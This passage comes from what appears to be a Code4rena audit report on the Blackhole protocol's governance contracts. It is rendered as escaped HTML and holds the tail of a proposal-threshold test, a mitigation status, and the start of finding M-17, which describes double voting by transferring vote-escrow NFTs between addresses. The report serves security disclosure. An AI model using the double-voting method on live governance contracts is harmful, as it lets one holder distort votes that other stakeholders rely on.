class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eskip\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e3600\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabi\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eencodeWithSelector\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enudge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eselector\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpectRevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e( \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Governor: proposer votes below proposal threshold\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epropose\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Nudge proposal\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-43\"\u003erayss\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-9\"\u003elonelybones\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-59\"\u003emaxvzuvex\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eThe sponsor team requested that the following note be included: \u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis issue originates from the upstream codebase, inherited from ThenaV2 fork. Given that ThenaV2 has successfully operated at scale for several months without incident, we assess the severity of this issue as low. The implementation has been effectively battle-tested in a production environment, which significantly reduces the practical risk associated with this finding.\nReference: \u003ca href=\"https://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/governance/Governor.sol#L256\"\u003ehttps://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/governance/Governor.sol#L256\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-17-users-can-cast-their-votes-multiple-times-for-the-proposal-by-transferring-their-nfts-and-then-voting-again\" style=\"position:relative;\"\u003e\u003ca href=\"#m-17-users-can-cast-their-votes-multiple-times-for-the-proposal-by-transferring-their-nfts-and-then-voting-again\" aria-label=\"m 17 users can cast their votes multiple times for the proposal by transferring their nfts and then voting again permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-165\"\u003e[M-17] Users can cast their votes multiple times for the proposal by transferring their nfts and then voting again\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-412\"\u003ehakunamatata\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L534-L554\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L534-L554\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L1263-L1279\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L1263-L1279\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-5\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-5\" aria-label=\"finding description and impact 5 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eIn the \u003ccode\u003eBlackGovernor\u003c/code\u003e contract users can cast their vote on the proposal. The requirements to cast the vote are that proposal has to be active, and the \u003ccode\u003emsg.sender\u003c/code\u003e has not voted on the proposal. The voting power is determined by the balance of it’s smNFT locked position at the time of \u003ccode\u003evoteStart\u003c/code\u003e. \u003c/p\u003e\n\u003cp\u003eThis introduces serious vulnerability where users can cast their vote at \u003ccode\u003evoteStart\u003c/code\u003e timestamp, immediately send their nft using \u003ccode\u003etransferFrom\u003c/code\u003e to another address which they control and \u003ccode\u003ecastVote\u003c/code\u003e again.  Malicious users can repeat this process they run out of gas.\u003c/p\u003e\n\u003cp\u003eOne of the reasons that this issue persists is that the code does not utilize ownership change mapping inside the \u003ccode\u003eVotingEscrow\u003c/code\u003e contract. Because it’s so easy to \u003ccode\u003ecastVote\u003c/code\u003e send to another address (which would be contract) and \u003ccode\u003ecastVote\u003c/code\u003e again, leading to complete disruption of voting process, I believe it is High Severity finding.\u003c/p\u003e\n\u003cp\u003eThis is code snippet of \u003ccode\u003ecastVote\u003c/code\u003e function that shows that there is no verification whether particular nft has been used to vote.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"67\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_castVote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereason\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eProposalCore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_proposals\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003estate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eActive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Governor: vote not currently active\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eweight\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_getVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eproposal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoteStart\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetDeadline\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003e_countVote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eweight\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eVoteCast\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eweight\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereason\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eVoteCastWithParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003esupport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eweight\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan 